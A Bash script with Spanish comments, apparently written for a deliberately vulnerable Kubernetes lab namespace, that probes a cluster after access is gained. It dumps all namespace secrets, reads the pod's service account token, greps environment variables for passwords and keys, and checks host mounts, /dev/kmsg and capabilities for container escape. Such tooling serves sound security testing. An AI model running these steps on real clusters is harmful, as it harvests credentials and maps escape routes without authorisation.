#!/bin/bash

# Script para explotar vulnerabilidades en el cluster Kubernetes

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"

echo -e "${BLUE}=== Explotando Vulnerabilidades en Kubernetes ===${NC}\n"
echo -e "${YELLOW}Namespace: $NAMESPACE${NC}\n"

# 1. Listar pods en el namespace
echo -e "${YELLOW}[1] Listando pods en namespace $NAMESPACE...${NC}"
kubectl get pods -n "$NAMESPACE"
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}')

if [ -z "$PODS" ]; then
    echo -e "${RED}✗ No se encontraron pods${NC}"
    exit 1
fi

# 2. Seleccionar el primer pod
FIRST_POD=$(echo $PODS | cut -d' ' -f1)
echo -e "${GREEN}✓ Usando pod: $FIRST_POD${NC}"

# 3. Verificar si el pod tiene privilegios
echo -e "\n${YELLOW}[2] Verificando security context del pod...${NC}"
kubectl get pod "$FIRST_POD" -n "$NAMESPACE" -o json | \
    jq -r '.spec.containers[0].securityContext' 2>/dev/null || \
    kubectl describe pod "$FIRST_POD" -n "$NAMESPACE" | grep -i "security\|privileged\|runAsUser"

# 4. Intentar ejecutar comandos en el pod
echo -e "\n${YELLOW}[3] Intentando ejecutar comandos en el pod...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- id 2>/dev/null && \
    echo -e "${GREEN}✓ Ejecución de comandos exitosa${NC}" || \
    echo -e "${RED}✗ No se pudo ejecutar comandos${NC}"

# 5. Verificar si podemos leer secretos
echo -e "\n${YELLOW}[4] Intentando leer secretos del namespace...${NC}"
SECRETS=$(kubectl get secrets -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)
if [ -n "$SECRETS" ]; then
    for SECRET in $SECRETS; do
        echo -e "${YELLOW}   Secret: $SECRET${NC}"
        kubectl get secret "$SECRET" -n "$NAMESPACE" -o yaml 2>/dev/null | head -20
    done
    echo -e "${GREEN}✓ Secretos accesibles${NC}"
else
    echo -e "${RED}✗ No se encontraron secretos${NC}"
fi

# 6. Verificar montajes de volumen
echo -e "\n${YELLOW}[5] Verificando montajes de volumen...${NC}"
kubectl describe pod "$FIRST_POD" -n "$NAMESPACE" | grep -i "mount\|volume" || \
    echo -e "${YELLOW}   Revisar manualmente${NC}"

# 7. Intentar acceder al sistema de archivos del host
echo -e "\n${YELLOW}[6] Verificando acceso al sistema de archivos del host...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- ls -la /host 2>/dev/null || \
    kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- mount | grep -i host || \
    echo -e "${YELLOW}   No se encontró acceso directo al host${NC}"

# 8. Buscar tokens de servicio
echo -e "\n${YELLOW}[7] Buscando service account tokens...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && \
    echo -e "${GREEN}✓ Token de service account encontrado${NC}" || \
    echo -e "${RED}✗ No se pudo leer el token${NC}"

# 9. Verificar variables de entorno
echo -e "\n${YELLOW}[8] Verificando variables de entorno del pod...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- env 2>/dev/null | grep -i "password\|secret\|key\|token" || \
    echo -e "${YELLOW}   No se encontraron variables sensibles${NC}"

# 10. Intentar escapar del contenedor (si es posible)
echo -e "\n${YELLOW}[9] Verificando posibilidades de escape del contenedor...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- ls -la /dev/kmsg 2>/dev/null && \
    echo -e "${GREEN}⚠ /dev/kmsg accesible (posible escape de contenedor)${NC}" || \
    echo -e "${YELLOW}   /dev/kmsg no accesible${NC}"

kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- cat /proc/self/status | grep -i "cap" 2>/dev/null || \
    echo -e "${YELLOW}   Revisar capabilities manualmente${NC}"

echo -e "\n${BLUE}=== Explotación de Kubernetes Completada ===${NC}"

